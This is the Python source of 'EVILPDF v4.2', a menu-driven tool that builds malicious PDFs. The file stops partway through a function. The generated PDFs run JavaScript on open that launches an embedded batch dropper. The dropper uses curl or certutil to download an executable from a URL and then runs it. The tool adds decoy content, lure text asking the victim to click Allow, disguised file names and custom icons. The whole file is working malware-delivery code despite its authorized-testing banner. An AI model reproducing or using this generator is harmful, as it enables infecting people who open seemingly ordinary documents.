#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""

███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░██████╗░███████╗
██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔══██╗██╔════╝
█████╗░░╚██╗░██╔╝██║██║░░░░░  ██████╔╝██║░░██║█████╗░░
██╔══╝░░░╚████╔╝░██║██║░░░░░  ██╔═══╝░██║░░██║██╔══╝░░
███████╗░░╚██╔╝░░██║███████╗  ██║░░░░░██████╔╝██║░░░░░
╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═╝░░░░░╚═════╝░╚═╝░░░░░

EVILPDF v4.2 — EXE ➜ EVIL PDF EXPLOIT GENERATOR
  • Downloads your EXE from a URL and EMBEDS it inside the PDF
  • /OpenAction JavaScript: opens a new tab, auto-launches the dropper
  • The CMD dropper downloads the EXE from your URL and OPENS it
  • Import YOUR OWN PDF as the visible document (--decoy) + preview it
  • Custom page text (100-1000 chars enforced) so the victim sees content
  • Rename the embedded file, or auto-detect name from the URL
  • --embed-exe direct mode, --debug object/offset dumps
  • --icon stamps a custom icon INTO the embedded EXE
  • NEW v4.2: embed YOUR OWN batch file (--batch) / custom JS (--js)
  • Menu-driven OR full CLI — 100% Python 3 standard library.

⚠ FOR AUTHORIZED SECURITY TESTING / AWARENESS USE ONLY ⚠
"""

import os
import re
import sys
import time
import random
import struct
import argparse
import subprocess
import urllib.request

__version__ = "4.2"

# ══════════════════════════════════════════════════════════════════
#  ANSI COLORS — green-on-black hacker style
# ══════════════════════════════════════════════════════════════════

class C:
    GREEN  = '\033[92m'
    LGREEN = '\033[32m'
    YELLOW = '\033[93m'
    RED    = '\033[91m'
    CYAN   = '\033[96m'
    BLUE   = '\033[94m'
    MAGENTA = '\033[95m'
    BOLD   = '\033[1m'
    DIM    = '\033[2m'
    RESET  = '\033[0m'
    BG_TITLE = '\033[102m\033[30m'


def init_ansi():
    if sys.platform.startswith('win'):
        os.system('')


def nocolor_if_dumb():
    if os.environ.get('NO_COLOR') or os.environ.get('TERM', '').lower() == 'dumb':
        for attr in ('GREEN', 'LGREEN', 'YELLOW', 'RED', 'CYAN', 'BLUE',
                     'MAGENTA', 'BOLD', 'DIM', 'RESET', 'BG_TITLE'):
            setattr(C, attr, '')


BANNER = rf"""{C.LGREEN}{C.BOLD}

███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░██████╗░███████╗
██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔══██╗██╔════╝
█████╗░░╚██╗░██╔╝██║██║░░░░░  ██████╔╝██║░░██║█████╗░░
██╔══╝░░░╚████╔╝░██║██║░░░░░  ██╔═══╝░██║░░██║██╔══╝░░
███████╗░░╚██╔╝░░██║███████╗  ██║░░░░░██████╔╝██║░░░░░
╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═╝░░░░░╚═════╝░╚═╝░░░░░
{C.RESET}
{C.BG_TITLE}{C.BOLD}   E V I L P D F  -  v%s  -  EXE EVIL PDF GENERATOR   {C.RESET}
{C.CYAN}{C.BOLD}
  ╔═══════════════════════════════════════════════════════════════╗
  ║ TOOL : EVILPDF v%s — EXE ➜ evil PDF exploit generator       ║
  ║ ON OPEN : new tab ➜ cmd downloads the EXE ➜ EXE opens        ║
  ║ Feat : own PDF decoy / custom text / rename embed / ICON      ║
  ║ Feat : own batch file / own OpenAction JS file                ║
  ║ USE  : authorized security testing / red team only            ║
  ╚═══════════════════════════════════════════════════════════════╝{C.RESET}
""" % (__version__, __version__)


# ══════════════════════════════════════════════════════════════════
#  STATUS / DEBUG
# ══════════════════════════════════════════════════════════════════

DEBUG = [False]

def ts():
    return time.strftime("%H:%M:%S")

def status(sym, msg, color=None):
    print(f"  {C.DIM}[{ts()}]{C.RESET} "
          f"{(color or C.GREEN)}{C.BOLD}[{sym}]{C.RESET} {msg}")

def dbg(msg):
    if DEBUG[0]:
        print(f"  {C.DIM}[debug]{C.RESET} {C.BLUE}{msg}{C.RESET}")

def hr(ch='─', n=64):
    print(f"  {C.DIM}{ch * n}{C.RESET}")


# ══════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════

TEXT_MIN = 100
TEXT_MAX = 1000


def url_filename(url, default="update.exe"):
    """Extract the exe file name from a URL (auto-detect current name)."""
    try:
        path = url.split('?')[0].split('#')[0]
        name = path.rstrip('/').rsplit('/', 1)[-1]
        if name and '.' in name and len(name) < 80:
            return name
    except Exception:
        pass
    return default


def esc_pdf(text):
    """Escape a string for a literal PDF text-showing operator."""
    return (text.replace('\\', '\\\\')
                .replace('(', '\\(')
                .replace(')', '\\)')
                .encode('latin-1', 'replace').decode('latin-1'))


def read_text_file(path):
    """Read a text file as bytes, tolerating odd encodings."""
    with open(path, 'rb') as f:
        raw = f.read()
    for enc in ('utf-8-sig', 'utf-8', 'cp1252', 'latin-1'):
        try:
            return raw.decode(enc), raw
        except UnicodeDecodeError:
            continue
    return raw.decode('latin-1', 'replace'), raw


# ══════════════════════════════════════════════════════════════════
#  ICON STAMPER — writes a .ico into the EXE's PE resources
# ══════════════════════════════════════════════════════════════════

def validate_ico(ico_path):
    """Check the file exists and looks like a real .ico (ICONDIR header)."""
    if not os.path.isfile(ico_path):
        return False, "icon file not found"
    try:
        with open(ico_path, 'rb') as f:
            head = f.read(6)
    except OSError as e:
        return False, str(e)
    if len(head) < 6 or head[0:2] != b'\x00\x00' or head[2:4] != b'\x01\x00':
        return False, "not a valid .ico file (bad ICONDIR header)"
    if int.from_bytes(head[4:6], 'little') == 0:
        return False, ".ico contains no images"
    return True, "ok"


def apply_icon_to_exe(exe_bytes, ico_path):
    """Return EXE bytes with the icon resource replaced (Windows only).

    Uses the Win32 resource API through ctypes (no external installs):
      BeginUpdateResource / UpdateResource / EndUpdateResource
    The .ico is parsed into RT_ICON entries + a rebuilt RT_GROUP_ICON,
    and stamped into the EXE's first icon-group slot.
    """
    if not sys.platform.startswith('win'):
        raise OSError("icon stamping requires Windows (Win32 resource API)")
    import ctypes
    import tempfile
    from ctypes import wintypes

    if not exe_bytes.startswith(b'MZ'):
        raise ValueError("payload is not a Windows PE executable")

    # -- parse the .ico --
    with open(ico_path, 'rb') as f:
        ico = f.read()
    count = int.from_bytes(ico[4:6], 'little')
    entries = []
    for i in range(count):
        off = 6 + 16 * i
        w, h, cc, res, planes, bits, size = struct.unpack_from('<BBBBHHI', ico, off)
        img_off = int.from_bytes(ico[off + 12:off + 16], 'little')
        data = ico[img_off:img_off + size]
        if len(data) != size or size == 0:
            raise ValueError("corrupt .ico entry #%d" % (i + 1))
        # ICONDIRENTRY with imageOffset replaced by 1-based icon id
        entry = struct.pack('<BBBBHHIH', w, h, cc, res, planes, bits, size, i + 1)
        entries.append((entry, data))
    group = struct.pack('<HHH', 0, 1, count) + b''.join(e[0] for e in entries)

    # -- put the exe on disk so the Win32 API can touch it --
    tmpd = tempfile.mkdtemp(prefix='evilpdf_icon_')
    exe_path = os.path.join(tmpd, 'payload.exe')
    with open(exe_path, 'wb') as f:
        f.write(exe_bytes)

    k32 = ctypes.WinDLL('kernel32', use_last_error=True)

    RT_ICON       = 3
    RT_GROUP_ICON = 14
    LANG_NEUTRAL  = 0
    LOAD_LIBRARY_AS_DATAFILE = 0x2

    # -- find the exe's existing first icon-group id (usually 1) --
    group_id = 1
    k32.LoadLibraryExW.argtypes = [wintypes.LPCWSTR, wintypes.HANDLE, wintypes.DWORD]
    k32.LoadLibraryExW.restype = wintypes.HMODULE
    h = k32.LoadLibraryExW(exe_path, None, LOAD_LIBRARY_AS_DATAFILE)
    if h:
        found = []

        CBNUM = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HMODULE,
                                   ctypes.c_void_p, ctypes.c_void_p, wintypes.LPARAM)
        def _cb(hmod, lpszType, lpszName, lparam):
            # numeric resource ids arrive as small pointer values (IS_INTRESOURCE)
            if lpszName and (lpszName >> 16) == 0:
                found.append(lpszName)
            return False   # stop after the first one

        k32.EnumResourceNamesW.argtypes = [wintypes.HMODULE, ctypes.c_void_p,
                                           CBNUM, wintypes.LPARAM]
        k32.EnumResourceNamesW.restype = wintypes.BOOL
        k32.EnumResourceNamesW(h, ctypes.c_void_p(RT_GROUP_ICON), CBNUM(_cb), 0)
        k32.FreeLibrary.argtypes = [wintypes.HMODULE]
        k32.FreeLibrary(h)
        if found:
            group_id = found[0]
            dbg("existing icon-group id: %d" % group_id)
        else:
            dbg("no existing icon group — creating id 1")

    # -- stamp the icon resources --
    k32.BeginUpdateResourceW.argtypes = [wintypes.LPCWSTR, wintypes.BOOL]
    k32.BeginUpdateResourceW.restype = wintypes.HANDLE
    hu = k32.BeginUpdateResourceW(exe_path, False)
    if not hu:
        raise OSError("BeginUpdateResource failed (err %d)"
                      % ctypes.get_last_error())

    k32.UpdateResourceW.argtypes = [wintypes.HANDLE, ctypes.c_void_p,
                                    ctypes.c_void_p, wintypes.WORD,
                                    ctypes.c_void_p, wintypes.DWORD]
    k32.UpdateResourceW.restype = wintypes.BOOL
    ok = True
    for idx, (_entry, data) in enumerate(entries, start=1):
        if not k32.UpdateResourceW(hu, ctypes.c_void_p(RT_ICON),
                                  ctypes.c_void_p(idx), LANG_NEUTRAL,
                                  data, len(data)):
            ok = False
            dbg("UpdateResourceW RT_ICON #%d failed (err %d)"
                % (idx, ctypes.get_last_error()))
    if not k32.UpdateResourceW(hu, ctypes.c_void_p(RT_GROUP_ICON),
                               ctypes.c_void_p(group_id), LANG_NEUTRAL,
                               group, len(group)):
        ok = False
        dbg("UpdateResourceW RT_GROUP_ICON failed (err %d)"
            % ctypes.get_last_error())

    k32.EndUpdateResourceW.argtypes = [wintypes.HANDLE, wintypes.BOOL]
    k32.EndUpdateResourceW.restype = wintypes.BOOL
    if not k32.EndUpdateResourceW(hu, False) or not ok:
        raise OSError("icon stamp failed (err %d)" % ctypes.get_last_error())

    # -- read back and clean up --
    with open(exe_path, 'rb') as f:
        new_bytes = f.read()
    try:
        os.remove(exe_path)
        os.rmdir(tmpd)
    except OSError:
        pass

    if not new_bytes.startswith(b'MZ') or len(new_bytes) < len(exe_bytes):
        raise ValueError("icon stamp corrupted the EXE — keeping original")
    dbg("exe size %s -> %s bytes after icon stamp"
        % (f"{len(exe_bytes):,}", f"{len(new_bytes):,}"))
    return new_bytes


# ══════════════════════════════════════════════════════════════════
#  EVILPDF GENERATOR
# ══════════════════════════════════════════════════════════════════

class EvilPDF:
    """EXE ➜ evil PDF exploit generator (v4.2).

    On open, /OpenAction JavaScript:
      1) app.launchURL(url, true) -> NEW BROWSER TAB to the EXE URL
      2) exportDataObject(nLaunch: 2) -> launches the embedded dropper

    v4.2: embed your own batch file (--batch) or supply the whole
    /OpenAction JavaScript from a file (--js) instead of the built-in.
    """

    def __init__(self, exe_url, pdf_name, save_path=".", embed="cmd",
                 decoy_pdf=None, custom_text=None, alias=None, debug=False,
                 icon=None, batch_file=None, js_file=None):
        self.exe_url   = exe_url.strip()
        self.pdf_name  = pdf_name.strip()
        self.save_path = save_path
        self.embed     = embed            # cmd | exe | url | batch | js
        self.decoy_pdf = decoy_pdf
        self.custom_text = custom_text    # list of lines or None
        self.alias     = alias            # embedded file name or None
        self.icon      = icon             # .ico file path (embed-exe only)
        self.batch_file = batch_file      # your own batch file (batch mode)
        self.js_file    = js_file         # your own OpenAction JS (js mode)
        self.exe_data  = None
        self.icon_applied = False
        self.output_file = None

    # ── VALIDATION ─────────────────────────────────────────────
    def validate(self):
        status("⚙", "Validating inputs...")

        if not self.exe_url:
            print(f"  {C.RED}[✗] EXE URL is empty!{C.RESET}")
            return False
        if not (self.exe_url.startswith("http://") or
                self.exe_url.startswith("https://")):
            print(f"  {C.RED}[✗] Invalid URL: {self.exe_url}{C.RESET}")
            return False

        if not self.pdf_name:
            print(f"  {C.RED}[✗] PDF name is empty!{C.RESET}")
            return False
        if any(ch in self.pdf_name for ch in '\\/:*?"<>|'):
            print(f"  {C.RED}[✗] Invalid PDF name: {self.pdf_name}{C.RESET}")
            return False

        self.save_path = os.path.abspath(os.path.expanduser(self.save_path.strip()))
        if not os.path.isdir(self.save_path):
            try:
                os.makedirs(self.save_path, exist_ok=True)
                status("✓", f"Created output dir: {C.CYAN}{self.save_path}{C.RESET}")
            except OSError as e:
                print(f"  {C.RED}[✗] Cannot create dir: {e}{C.RESET}")
                return False

        if not self.pdf_name.lower().endswith('.pdf'):
            self.pdf_name += '.pdf'
        self.output_file = os.path.join(self.save_path, self.pdf_name)

        # ── decoy PDF check ──
        if self.decoy_pdf:
            self.decoy_pdf = os.path.abspath(os.path.expanduser(self.decoy_pdf))
            if not os.path.isfile(self.decoy_pdf):
                print(f"  {C.RED}[✗] Decoy PDF not found: {self.decoy_pdf}{C.RESET}")
                return False
            try:
                with open(self.decoy_pdf, 'rb') as f:
                    head = f.read(8)
                if not head.startswith(b'%PDF-'):
                    print(f"  {C.RED}[✗] Decoy file is not a valid PDF!{C.RESET}")
                    return False
            except OSError as e:
                print(f"  {C.RED}[✗] Cannot read decoy: {e}{C.RESET}")
                return False
            status("✓", f"Decoy PDF ready : {C.CYAN}{self.decoy_pdf}{C.RESET} "
                        f"({C.YELLOW}{os.path.getsize(self.decoy_pdf):,}{C.RESET} bytes)")

        # ── custom page text length ──
        if self.custom_text:
            blob = "\n".join(self.custom_text)
            n = len(blob)
            if n > TEXT_MAX:
                print(f"  {C.RED}[✗] Page text is {n} chars — max is "
                      f"{TEXT_MAX}!{C.RESET}")
                return False
            if n < TEXT_MIN:
                status("!", f"Page text is only {n} chars (min {TEXT_MIN}) — "
                            f"the page will look sparse.", C.YELLOW)
            status("✓", f"Page text       : {C.YELLOW}{n}{C.RESET}/{TEXT_MAX} chars")

        # ── icon checks ──
        if self.icon:
            self.icon = os.path.abspath(os.path.expanduser(self.icon))
            ok, why = validate_ico(self.icon)
            if not ok:
                print(f"  {C.RED}[✗] Invalid icon file '{self.icon}': {why}{C.RESET}")
                return False
            if self.embed != "exe":
                status("!", f"Icon ignored in '{self.embed}' mode — the icon can "
                            f"only be stamped into a directly-embedded EXE "
                            f"(use --embed-exe).", C.YELLOW)
                self.icon = None
            else:
                size = os.path.getsize(self.icon)
                status("✓", f"Icon file OK    : {C.CYAN}{self.icon}{C.RESET} "
                            f"({C.YELLOW}{size:,}{C.RESET} bytes)")

        # ── your own batch file ──
        if self.embed == "batch":
            if not self.batch_file:
                print(f"  {C.RED}[✗] batch mode needs a batch file path!{C.RESET}")
                return False
            self.batch_file = os.path.abspath(os.path.expanduser(self.batch_file))
            if not os.path.isfile(self.batch_file):
                print(f"  {C.RED}[✗] Batch file not found: {self.batch_file}{C.RESET}")
                return False
            try:
                body, raw = read_text_file(self.batch_file)
            except OSError as e:
                print(f"  {C.RED}[✗] Cannot read batch file: {e}{C.RESET}")
                return False
            if not body.strip():
                print(f"  {C.RED}[✗] Batch file is empty!{C.RESET}")
                return False
            status("✓", f"Batch file OK   : {C.CYAN}{self.batch_file}{C.RESET} "
                        f"({C.YELLOW}{len(raw):,}{C.RESET} bytes, "
                        f"{len(body.splitlines())} lines)")
            if not re.search(r'(?im)^\s*@?echo', body):
                status("!", "Batch file has no @echo off — the victim may see "
                            "the command trace.", C.YELLOW)

        # ── your own OpenAction JavaScript ──
        if self.embed == "js":
            if not self.js_file:
                print(f"  {C.RED}[✗] js mode needs a JavaScript file path!{C.RESET}")
                return False
            self.js_file = os.path.abspath(os.path.expanduser(self.js_file))
            if not os.path.isfile(self.js_file):
                print(f"  {C.RED}[✗] JS file not found: {self.js_file}{C.RESET}")
                return False
            try:
                js_src, _raw = read_text_file(self.js_file)
            except OSError as e:
                print(f"  {C.RED}[✗] Cannot read JS file: {e}{C.RESET}")
                return False
            if not js_src.strip():
                print(f"  {C.RED}[✗] JS file is empty!{C.RESET}")
                return False
            self.js_src = js_src
            status("✓", f"JS file OK      : {C.CYAN}{self.js_file}{C.RESET} "
                        f"({C.YELLOW}{len(js_src):,}{C.RESET} chars)")
            if "exportDataObject" not in js_src:
                status("!", "JS has no exportDataObject() call — the embedded "
                            "dropper will not auto-launch.", C.YELLOW)

        # ── resolve embedded file name ──
        self.auto_exe_name = url_filename(self.exe_url)
        if self.embed == "exe" or not self.embed:
            self.embed_name = (self.alias or self.auto_exe_name)
            if self.embed == "exe" and not self.embed_name.lower().endswith('.exe'):
                self.embed_name += '.exe'
        elif self.embed == "batch":
            a = (self.alias or os.path.basename(self.batch_file) or "update.cmd").strip()
            if a.lower().endswith('.txt'):
                a = a[:-4]
            if not (a.lower().endswith('.cmd') or a.lower().endswith('.bat')):
                a += '.cmd'
            self.embed_name = a
        else:  # cmd / js mode
            a = (self.alias or "update.cmd").strip()
            if not (a.lower().endswith('.cmd') or a.lower().endswith('.bat')):
                a += '.cmd'
            self.embed_name = a

        if self.embed:
            status("✓", f"Embedded file    : {C.CYAN}{self.embed_name}{C.RESET}")
        status("✓", f"Detected EXE name from URL: "
                    f"{C.CYAN}{self.auto_exe_name}{C.RESET}")
        status("✓", f"Target output    : {C.CYAN}{self.output_file}{C.RESET}")
        return True

    # ── DOWNLOAD EXE (pre-flight) ──────────────────────────────
    def download_exe(self):
        try:
            status("⬇", f"Pre-flight — fetching payload: {C.CYAN}{self.exe_url}{C.RESET}")
            req = urllib.request.Request(
                self.exe_url,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            t0 = time.time()
            with urllib.request.urlopen(req, timeout=30) as resp:
                self.exe_data = resp.read()
            dt = time.time() - t0
            if len(self.exe_data) < 64:
                status("!", f"Payload very small ({len(self.exe_data)} bytes) "
                            f"— check the URL", C.YELLOW)
            status("✓", f"Payload OK: {C.YELLOW}{len(self.exe_data):,}{C.RESET} bytes "
                        f"in {dt:.2f}s")
            return True
        except Exception as e:
            print(f"  {C.RED}[✗] Error fetching EXE: {e}{C.RESET}")
            return False

    # ── CMD DROPPER (downloads the EXE + opens it) ────────────
    def build_cmd_dropper(self):
        return (
            "@echo off\r\n"
            "setlocal\r\n"
            f'set "EXEURL={self.exe_url}"\r\n'
            f'set "EXENAME={self.auto_exe_name}"\r\n'
            'set "EXEDIR=%TEMP%\\evilpdf"\r\n'
            'if not exist "%EXEDIR%" mkdir "%EXEDIR%"\r\n'
            'cd /d "%EXEDIR%"\r\n'
            'where curl >nul 2>nul\r\n'
            'if %errorlevel%==0 (\r\n'
            '    curl -s -L -o "%EXENAME%" "%EXEURL%"\r\n'
            ') else (\r\n'
            '    certutil -urlcache -split -f "%EXEURL%" "%EXENAME%" >nul 2>nul\r\n'
            ')\r\n'
            'if exist "%EXENAME%" (\r\n'
            '    start "" "%EXENAME%"\r\n'
            ')\r\n'
            "endlocal\r\n"
        )

    # ── PAYLOAD BYTES ──────────────────────────────────────────
    def build_payload(self):
        if self.embed in ("cmd", "js"):
            return self.build_cmd_dropper().encode('utf-8')
        if self.embed == "batch":
            _body, raw = read_text_file(self.batch_file)
            raw = raw.replace(b'\r\n', b'\n').replace(b'\r', b'\n')
            raw = raw.replace(b'\n', b'\r\n')
            if raw and not raw.endswith(b'\r\n'):
                raw += b'\r\n'
            return raw
        if self.embed == "exe":
            if self.exe_data is None and not self.download_exe():
                raise ValueError("could not download EXE for embed")
            return self.exe_data
        return b""

    # ── /OpenAction JAVASCRIPT ─────────────────────────────────
    def build_javascript(self):
        # user-supplied JS wins
        if self.embed == "js" and getattr(self, "js_src", ""):
            dbg("using user-supplied JavaScript from " + self.js_file)
            return self.js_src

        url_css = self.exe_url.replace('\\', '\\\\').replace('"', '\\"')
        name_css = self.embed_name.replace('\\', '\\\\').replace('"', '\\"')
        if not self.embed:
            js = f"""
try {{ app.launchURL("{url_css}", true); }}
catch(e) {{ try {{ this.getURL("{url_css}"); }} catch(e2) {{}} }}
"""
        else:
            js = f"""
try {{
    // ► STEP 1: open a NEW BROWSER TAB pointing at the EXE URL
    try {{ app.launchURL("{url_css}", true); }} catch(e0) {{}}
    // ► STEP 2: auto-launch the embedded dropper (cmd window opens)
    try {{
        this.exportDataObject({{cName: "{name_css}", nLaunch: 2}});
    }} catch(e1) {{
        try {{ this.getURL("{url_css}"); }} catch(e2) {{}}
    }}
}} catch(outer) {{
    try {{ app.launchURL("{url_css}", true); }} catch(unused) {{}}
}}
"""
        dbg("JS payload:\n" + js)
        return js

    # ── VISIBLE PAGE CONTENT (custom text support) ────────────
    def build_page_content(self):
        if self.custom_text:
            lines = [ln for ln in self.custom_text if ln.strip()]
        else:
            lines = ["Document", "",
                     "Please wait while the document loads...",
                     "A security warning may appear if you open this file",
                     "outside of a trusted location. Click Allow to continue."]
        max_lines = 39                      # fits inside the 612x792 mediabox
        if len(lines) > max_lines:
            status("!", f"{len(lines)} text lines — only the first {max_lines} "
                        f"fit on the page.", C.YELLOW)
            lines = lines[:max_lines]
        ops, y = [], 712
        for i, ln in enumerate(lines):
            text = ln.strip()
            if text:
                if i == 0:
                    ops.append(f"BT /F1 18 Tf 72 {y} Td ({esc_pdf(text)}) Tj ET")
                    y -= 30
                else:
                    ops.append(f"BT /F2 12 Tf 72 {y} Td ({esc_pdf(text)}) Tj ET")
                    y -= 18
            else:
                y -= 18
        return "\n".join(ops) + "\n"

    # ── PDF TEXT ESCAPE for JS object ──────────────────────────
    @staticmethod
    def js_literal(js):
        return (js.replace('\\', '\\\\')
                  .replace('(', '\\(')
                  .replace(')', '\\)'))

    @staticmethod
    def esc_name(name):
        return name.replace('\\', r'\\').replace('(', r'\(').replace(')', r'\)')

    # ══ BUILD MODE A: WITH USER-PROVIDED DECOY PDF ═══════════
    def build_with_decoy(self):
        with open(self.decoy_pdf, 'rb') as f:
            raw = f.read()

        # -- parse existing structure --
        nums = [int(n) for n in re.findall(rb'(\d+)\s+0\s+obj\b', raw)]
        if not nums:
            raise ValueError("no objects found in decoy PDF")
        base = max(nums)
        sm = re.search(rb'startxref\s+(\d+)', raw[-4096:])
        if not sm:
            raise ValueError("no startxref found in decoy PDF")
        old_xref = int(sm.group(1))
        tr = re.search(rb'/Root\s+(\d+)\s+0\s+R', raw)
        if not tr:
            raise ValueError("no /Root in decoy trailer")
        root_num = int(tr.group(1))
        root_body = b''
        for m in re.finditer(rb'(\d+)\s+0\s+obj(.*?)endobj', raw, re.S):
            if int(m.group(1)) == root_num:
                root_body = m.group(2)
                break
        pm = re.search(rb'/Pages\s+(\d+)\s+0\s+R', root_body)
        if not pm:
            raise ValueError("decoy root has no /Pages — cannot import")
        pages_ref = f"{int(pm.group(1))} 0 R"

        dbg(f"decoy max_obj={base} old_xref=@{old_xref} "
            f"root={root_num} pages={pages_ref}")

        # -- payload bytes --
        payload = self.build_payload()

        js = self.js_literal(self.build_javascript())

        marker = "EVILPDF_PAYLOAD"
        new_objs = []

        # new catalog: clone decoy /Pages + our /OpenAction + attachments
        n_cat = base + 1
        cat = (f"<< /Type /Catalog /Pages {pages_ref} /OpenAction "
               f"{n_cat + 1} 0 R")
        if self.embed:
            cat += (f" /Names << /EmbeddedFiles << /Names "
                    f"[({self.esc_name(self.embed_name)}) "
                    f"{n_cat + 2} 0 R] >> >> /PageMode /UseAttachments")
        cat += " >>"
        new_objs.append(cat.encode('latin-1'))

        # OpenAction JS
        new_objs.append(f"<< /S /JavaScript /JS ({js}) >>".encode('latin-1'))

        # Filespec + embedded stream
        if self.embed:
            new_objs.append((f"<< /Type /Filespec /F ({self.esc_name(self.embed_name)}) "
                             f"/EF << /F {n_cat + 3} 0 R >> >>").encode('latin-1'))
            new_objs.append((f"<< /Type /EmbeddedFile /Subtype "
                             f"/application/octet-stream /Length {len(payload)} >>\n"
                             f"stream\n{marker}\nendstream").encode('latin-1'))
        else:
            new_objs.append(b"<< /Type /Filespec /F (null) /Length 0 >>")
            new_objs.append(b"<< /Type /EmbeddedFile /Length 0 >>\nstream\n\nendstream")

        # -- assemble --
        out = bytearray(raw)
        offsets = []
        for i, body in enumerate(new_objs):
            n = n_cat + i
            offsets.append((n, len(out)))
            out += f"{n} 0 obj\n".encode()
            if marker.encode() in body and payload:
                head, _, tail = body.partition(marker.encode())
                out += head + payload + tail
            else:
                out += body
            out += b"\nendobj\n"

        xref_off = len(out)
        out += f"xref\n{n_cat} {len(new_objs)}\n".encode()
        for _n, off in offsets:
            out += f"{off:010d} 00000 n \n".encode()
        out += (f"trailer\n<< /Size {base + len(new_objs) + 1} /Root "
                f"{n_cat} 0 R /Prev {old_xref} >>\n"
                f"startxref\n{xref_off}\n%%EOF\n").encode()

        if DEBUG[0]:
            print(f"  {C.DIM}[debug] appended objects:{C.RESET}")
            for n, off in offsets:
                print(f"  {C.DIM}[debug]   obj {n:>3} @ {off}{C.RESET}")
        return bytes(out), offsets, base

    # ══ BUILD MODE B: FULL PDF FROM SCRATCH ══════════════════
    def build_scratch(self):
        js = self.js_literal(self.build_javascript())

        payload = self.build_payload()

        objs = []

        cat = "<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R"
        if self.embed:
            cat += (f" /Names << /EmbeddedFiles << /Names "
                    f"[({self.esc_name(self.embed_name)}) 6 0 R] >> >> "
                    f"/PageMode /UseAttachments")
        cat += " >>"
        objs.append(cat)

        objs.append("<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        objs.append("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
                    "/Contents 4 0 R /Resources << /Font "
                    "<< /F1 8 0 R /F2 9 0 R >> >> >>")

        pc = self.build_page_content()
        objs.append(f"<< /Length {len(pc)} >>\nstream\n{pc}endstream")
        objs.append(f"<< /S /JavaScript /JS ({js}) >>")

        if self.embed:
            objs.append(f"<< /Type /Filespec /F ({self.esc_name(self.embed_name)}) "
                        f"/EF << /F 7 0 R >> >>")
        else:
            objs.append("<< /Type /Filespec /F (null) /Length 0 >>")

        if self.embed:
            objs.append(f"<< /Type /EmbeddedFile /Subtype "
                        f"/application/octet-stream /Length {len(payload)} >>\n"
                        f"stream\nEVILPDF_PAYLOAD\nendstream")
        else:
            objs.append("<< /Type /EmbeddedFile /Length 0 >>\nstream\n\nendstream")

        objs.append("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>")
        objs.append("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")

        file_id = ''.join(random.choices('0123456789ABCDEF', k=32))
        marker = "EVILPDF_PAYLOAD"

        pdf = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
        labels = ["Catalog", "Pages", "Page", "Contents",
                  "OpenAction", "Filespec", "EmbeddedFile", "Font", "Font"]
        offsets, rows = [], []
        for num, body in enumerate(objs, start=1):
            off = len(pdf)
            offsets.append(off)
            pdf += f"{num} 0 obj\n".encode()
            if marker in body:
                head, _, tail = body.partition(marker.encode())
                pdf += head.encode()
                pdf += payload
                pdf += tail.encode()
            else:
                pdf += body.encode()
            pdf += b"endobj\n"
            rows.append((num, labels[num - 1], off))

        xref_off = len(pdf)
        pdf += f"xref\n0 {len(objs) + 1}\n".encode()
        pdf += b"0000000000 65535 f \n"
        for off in offsets:
            pdf += f"{off:010d} 00000 n \n".encode()
        pdf += (f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R "
                f"/ID [<{file_id}> <{file_id}>] >>\n"
                f"startxref\n{xref_off}\n%%EOF\n").encode()
        return bytes(pdf), rows, None

    # ── stamp the custom icon into the EXE bytes ──────────────
    def stamp_icon(self):
        """If an icon was configured, stamp it into self.exe_data."""
        if not self.icon or self.embed != "exe" or self.exe_data is None:
            return
        if not sys.platform.startswith('win'):
            status("!", "Icon NOT applied: icon stamping needs Windows "
                       "(running on %s)." % sys.platform, C.YELLOW)
            return
        try:
            status("⚙", f"Stamping icon into EXE: {C.CYAN}{self.icon}{C.RESET} ...")
            self.exe_data = apply_icon_to_exe(self.exe_data, self.icon)
            self.icon_applied = True
            status("✓", f"Icon applied! EXE is now "
                        f"{C.YELLOW}{len(self.exe_data):,}{C.RESET} bytes")
        except Exception as e:
            status("!", f"Icon stamp failed ({e}) — embedding the EXE with "
                       f"its ORIGINAL icon.", C.YELLOW)

    # ── MAIN GENERATE ─────────────────────────────────────────
    def generate(self):
        try:
            if self.embed == "exe" and not self.download_exe():
                print("  " + C.RED + "[✗] cannot continue without the EXE" + C.RESET)
                return False

            # stamp the icon BEFORE building the PDF
            if self.embed == "exe":
                self.stamp_icon()

            mode = "decoy-import" if self.decoy_pdf else "scratch"
            status("⚙", f"Building exploit structure ({mode} mode)...")
            if self.decoy_pdf:
                try:
                    pdf, rows, _ = self.build_with_decoy()
                except ValueError as e:
                    print(f"  {C.RED}[✗] decoy import failed: {e}{C.RESET}")
                    print(f"  {C.YELLOW}[!] falling back to scratch mode...{C.RESET}")
                    self.decoy_pdf = None
                    pdf, rows, _ = self.build_scratch()
            else:
                pdf, rows, _ = self.build_scratch()

            status("⚙", f"Writing PDF: {C.CYAN}{self.output_file}{C.RESET} ...")
            with open(self.output_file, 'wb') as f:
                f.write(pdf)

            size = os.path.getsize(self.output_file)
            if size < 500:
                print(f"  {C.RED}[✗] output suspiciously small!{C.RESET}")
                return False
            status("✓", f"EVIL PDF created : {C.CYAN}{self.output_file}{C.RESET}")
            status("✓", f"File size        : {C.YELLOW}{size:,}{C.RESET} bytes")

            if DEBUG[0]:
                hr()
                print(f"  {C.DIM}[debug] object map:{C.RESET}")
                for r in rows:
                    if isinstance(r, tuple) and len(r) == 3:
                        print(f"  {C.DIM}[debug]   obj {r[0]:>3} "
                              f"{r[1]:<12} @ {r[2]}{C.RESET}")
                hr()

            print()
            hr('═')
            print(f"  {C.BOLD}{C.YELLOW}EXPLOIT DETAILS:{C.RESET}")
            hr('═')
            def row(label, value):
